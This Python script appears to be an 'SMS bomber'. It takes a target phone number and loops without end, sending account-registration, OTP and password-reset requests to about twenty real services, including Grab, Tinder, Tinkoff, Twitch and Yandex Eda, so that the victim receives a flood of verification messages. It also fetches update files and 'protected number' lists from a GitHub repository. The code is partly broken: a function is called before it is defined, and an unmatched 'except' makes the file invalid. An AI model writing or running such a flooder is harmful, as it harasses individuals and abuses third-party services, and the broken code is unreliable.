import requests, random, datetime, sys, time, argparse, os
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
import base64
init()


def shutdown(signal, frame):
    print ('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()

def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies..")
        banner()
        exit()

try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()

print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/4nat/Reborn/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("Your Version is Update!")
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/4nat/Reborn/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\t Message :  ' + noti + '\n\n')
except Exception:
    pass
def update():
    stuff_to_update = ['demo.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/4nat/Reborn/master/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
    print('\n\t\tUpdated Successfull !!!!')
    print('\tPlease Run The Script Again...')
    exit()

first = input ("Enter Target Number ---> ")
os.system('clear')
num1 = urllib.request.urlopen(
"https://raw.githubusercontent.com/4nat/reader/master/a.txt").read()
print("Scanning VIP Numbers.")
time.sleep(1)
os.system('clear')
print("Scanning VIP Numbers..")
time.sleep(1)
os.system('clear')
print("Scanning VIP Numbers...")
time.sleep(1)
num2 = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/reader/master/b.txt").read()
decode=print("Decoding....")
time.sleep(1)
test1=int(base64.b64decode(num1))
print("Reading......")
time.sleep(1)
test2=int(base64.b64decode(num2))
if int(first)==test1:print("This Number Protecting...");exit()
elif int(first)==test2:print("This Number Protecting...");exit()
else:os.system('clear')
_phone = input("Enter Target Number Again--->")
os.system('clear')
time.sleep(2)



_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]






iteration = 0



while True:


	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
                
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print('[+] Grab Requests Successful!')
	except:
		print('[-] Grab Requests Failed!')

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('[+] RuTaxi Requests Successful!')
	except:
		print('[-] RuTaxi Requests Failed!')

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print('[+] BelkaCar Requests Successful!')
	except:
		print('[-] BelkaCar Requests Failed!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('[+] Tinder Requests Successful!')
	except:
		print('[-] Tinder Requests Failed!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('[+] Karusel Requests Successful!')
	except:
		print('[-] Karusel Requests Failed!')

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print('[+] Tinkoff Requests Successful!')
	except:
		print('[-] Tinkoff Requests Failed!')

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('[+] MTS Requests Successful!')
	except:
		print('[-] MTS Requests Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Youla Requests Successful!')
	except:
		print('[-] Youla Requests Failed!')

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print('[+] PizzaHut Requests Successful!')
	except:
		print('[-] PizzaHut Requests Failed!')

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print('[+] Rabota Requests Successful!')
	except:
		print('[-] Rabota Requests Failed!')

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print('[+] Smsint Requests Successful!')
	except:
		print('[-] Smsint Requests Failed!')

		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print('[+] Tinder Requests Successful!')
	except:
		print('[-] Tinder Requests Failed!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('[+] Twitch Requests Successful!')
	except:
		print('[-] Twitch Requests Failed!')

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('[+] CabWiFi Requests Successful!')
	except:
		print('[-] CabWiFi Requests Failed!')

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print('[+] wowworks Requests Successful!')
	except:
		print('[-] wowworks Requests Failed!')

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print('[+] Eda.Yandex Requests Successful!')
	except:
		print('[-] Eda.Yandex Requests Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Youla Requests Successful!')
	except:
		print('[-] Youla Requests Failed!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print('[+] Alpari Requests Successful!')
	except:
		print('[-] Alpari Requests Failed!')
	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('[+] Delivery Requests Successful!')
	except:
		print('[-] Delivery Requests Failed!')

	try:
		iteration += 1
		print(' = {}completed tours '.format(iteration)) 
	except:
		break
